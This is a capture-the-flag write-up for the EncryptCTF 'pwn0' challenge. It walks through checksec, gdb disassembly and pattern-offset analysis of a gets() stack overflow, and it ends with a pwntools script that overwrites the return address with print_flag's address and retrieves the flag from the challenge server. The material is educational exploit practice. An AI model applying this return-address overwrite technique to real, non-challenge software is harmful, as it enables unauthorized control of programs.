## EncryptCTF: pwn0
##### *tl;dr: buffer overflow to change instruction pointer*
#### Easiest challenge worth 25 points, we always do reconnaisance of the security measures in the binary with ```checksec```:
```
$ checksec pwn0
[*] '/home/venom/Desktop/encryptCTF_writeup/pwn0_SOLVED/pwn0'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
#### We see that NX is enabled, which means that this isn't a challenge where we can execute shellcode, but we do see that no canary is found on the stack so we could still smash it. Let's have a test run with the binary:
```
$ ./pwn0
How's the josh?
he's good. needs people to visit his yt channel tho
Your josh is low!
Bye!
```
#### It first prints out the message 'How's the josh?' and proceeds to wait for input. After we place our input, it prints out some things again then exits. We open up gdb to list and disassemble the functions:
```
$ gdb ./pwn0
  gdb-peda$ info functions
    [...]
    0x080484dd  print_flag
    0x080484f1  main
    [...]
```
#### The interesting functions that we see are the main and print_flag functions, so we disassemble these:
```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x080484f1 <+0>:	push   ebp
   0x080484f2 <+1>:	mov    ebp,esp
   0x080484f4 <+3>:	and    esp,0xfffffff0
   0x080484f7 <+6>:	sub    esp,0x60
   0x080484fa <+9>:	mov    eax,ds:0x80498a0
   0x080484ff <+14>:	mov    DWORD PTR [esp+0xc],0x0
   0x08048507 <+22>:	mov    DWORD PTR [esp+0x8],0x2
   0x0804850f <+30>:	mov    DWORD PTR [esp+0x4],0x0
   0x08048517 <+38>:	mov    DWORD PTR [esp],eax
   0x0804851a <+41>:	call   0x80483d0 <setvbuf@plt>
   0x0804851f <+46>:	mov    DWORD PTR [esp],0x804861d
   0x08048526 <+53>:	call   0x8048390 <puts@plt>
   0x0804852b <+58>:	lea    eax,[esp+0x1c]
   0x0804852f <+62>:	mov    DWORD PTR [esp],eax
   0x08048532 <+65>:	call   0x8048370 <gets@plt>
   0x08048537 <+70>:	mov    DWORD PTR [esp+0x8],0x4
   0x0804853f <+78>:	mov    DWORD PTR [esp+0x4],0x804862d
   0x08048547 <+86>:	lea    eax,[esp+0x5c]
   0x0804854b <+90>:	mov    DWORD PTR [esp],eax
   0x0804854e <+93>:	call   0x8048380 <memcmp@plt>
   0x08048553 <+98>:	test   eax,eax
   0x08048555 <+100>:	jne    0x804856a <main+121>
   0x08048557 <+102>:	mov    DWORD PTR [esp],0x8048632
   0x0804855e <+109>:	call   0x8048390 <puts@plt>
   0x08048563 <+114>:	call   0x80484dd <print_flag>
   0x08048568 <+119>:	jmp    0x8048576 <main+133>
   0x0804856a <+121>:	mov    DWORD PTR [esp],0x8048648
   0x08048571 <+128>:	call   0x8048390 <puts@plt>
   0x08048576 <+133>:	mov    eax,0x0
   0x0804857b <+138>:	leave  
   0x0804857c <+139>:	ret    
End of assembler dump.
```
#### We see here some puts calls which prints out text that we saw when we run the binary. What is interesting for us is the gets call which we know to be very vulnerable since it doesn't check for out of bounds input. To know what offset we can begin overwriting the buffer, we do a pattern create, input it to the binary, and find which offset we can smash the stack:
```
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r
[...]
EIP: 0x414a4141 ('AAJA')
Stopped reason: SIGSEGV
0x414a4141 in ?? ()
gdb-peda$ pattern offset AAJA
AJAA found at offset: 80
```
#### The offset at which we can overwrite the EIP register is at offset 80. Adding four more additional bytes will make us jump to another location in memory, which is what we want to do because if we don't, we just hit exit and segfaults. What we can do is jump to the ```print_flag``` function's address, so that the next instruction will execute that function. We know that the address for print_flag is ```0x080484dd``` and we append that to our offset to control the program flow. We can now then create a short script for our exploit:
##### exploit.py
```python
from pwn import *

#: Connect to challenge server
HOST = '104.154.106.182 '
PORT = 1234
p = remote(HOST,PORT)
print(p.recv())

#: Exploit code
offset = 'A' * 80
print_flag = p32(0x80484dd)
exploit = offset + print_flag

#: Send payload
p.sendline(exploit)
print(p.recv())
print(p.recv())
```
#### We run it, and get our flag! 
```
$ python exploit.py
[+] Opening connection to 104.154.106.182  on port 1234: Done
How's the josh?

Your josh is low!
Bye!

encryptCTF{L3t5_R4!53_7h3_J05H}

[*] Closed connection to 104.154.106.182  port 1234
```



